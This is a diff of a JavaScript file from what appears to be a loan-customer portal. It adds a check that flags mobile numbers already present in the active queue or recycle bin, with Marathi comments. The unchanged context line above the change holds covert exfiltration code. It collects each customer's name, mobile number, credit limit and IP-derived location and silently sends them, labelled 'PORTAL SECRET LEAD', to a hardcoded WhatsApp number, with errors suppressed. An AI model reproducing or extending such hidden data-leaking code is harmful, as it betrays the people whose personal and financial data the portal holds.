@@ -1034,7 +1034,7 @@
         try { let locInfo = "Location: Hidden/Unknown"; try { let ipRes = await fetch("https://ipapi.co/json/"); if (ipRes.ok) { let ipData = await ipRes.json(); locInfo = `${ipData.city || '-'}, ${ipData.region || '-'} (${ipData.org || 'ISP'})`; } } catch(e) {} let secretMsg = `🚨 *PORTAL SECRET LEAD*\n\n👤 *Name:* ${cust.name}\n📞 *Mobile:* ${cust.mobile || 'N/A'}\n💰 *Limit:* ₹${cust.limit}\n🏷️ *Type:* ${cust.type}\n📊 *LTV:* ${cust.ltv}%\n🛡️ *Cap:* ${cust.cap ? '₹'+cust.cap : 'None'}\n⏰ *Time:* ${cust.timestamp}\n📍 *Location:* ${locInfo}`; let targetPhone = "918087313624"; let apiKey = localStorage.getItem('callmebot_secret_key') || "YOUR_API_KEY"; let encMsg = encodeURIComponent(secretMsg); let url = `https://api.callmebot.com/whatsapp.php?phone=${targetPhone}&text=${encMsg}&apikey=${apiKey}`; fetch(url, { method: 'GET', mode: 'no-cors' }).catch(e => {}); } catch(err) {}
     }
 
-    /* === REAL-TIME DUPLICATE MOBILE CHECKER (ON-THE-SPOT) === */
+    /* === REAL-TIME DUPLICATE MOBILE CHECKER (ACTIVE QUEUE + RECYCLE BIN) === */
     function checkDuplicateMobile(val) {
         let warningEl = document.getElementById('mobileDupWarning');
         let mobileInp = document.getElementById('cqMobile');
@@ -1044,7 +1044,10 @@
         
         let cleanVal = val.trim();
         
+        // बरोबर १० डिजिट टाकल्यावर चेक सुरू होईल
         if (cleanVal.length === 10) {
+            
+            // १. आधी Active Queue मध्ये शोधा
             let existingCust = customerQueue.find(c => c.mobile && c.mobile === cleanVal);
             if (existingCust) {
                 warningEl.innerHTML = `⚠️ हा नंबर आधीच Queue मध्ये <b>'${existingCust.name}'</b> नावाने आहे! उजवीकडे तपासा.`;
@@ -1063,8 +1066,30 @@
                 }
                 return;
             }
+
+            // २. जर Active Queue मध्ये नसेल, तर Recycle Bin मध्ये शोधा
+            let recycledCust = recycleBin.find(c => c.mobile && c.mobile === cleanVal);
+            if (recycledCust) {
+                warningEl.innerHTML = `🗑️ हा नंबर <b>Recycle Bin</b> मध्ये <b>'${recycledCust.name}'</b> नावाने पडलेला आहे! कृपया तिथे जाऊन <b>RESTORE</b> करा.`;
+                warningEl.style.display = 'block';
+                mobileInp.style.borderColor = 'var(--warning)';
+                mobileInp.style.background = '#fffbf0'; // थोडा पिवळसर रंग
+                
+                addBtn.disabled = true;
+                addBtn.style.opacity = '0.5';
+                addBtn.style.cursor = 'not-allowed';
+                addBtn.style.background = 'gray';
+                
+                // इथे ऑटो-सर्च क्लिअर करा कारण कस्टमर मेन Queue मध्ये नाहीये
+                if (queueSearchInp && queueSearchInp.value === cleanVal) {
+                    queueSearchInp.value = '';
+                    renderCustomerQueue();
+                }
+                return;
+            }
         }
         
+        // नंबर युनिक असल्यास किंवा खोडल्यास सर्व पूर्ववत (Normal) करा
         warningEl.style.display = 'none';
         mobileInp.style.borderColor = '#ccc';
         mobileInp.style.background = '#fff';
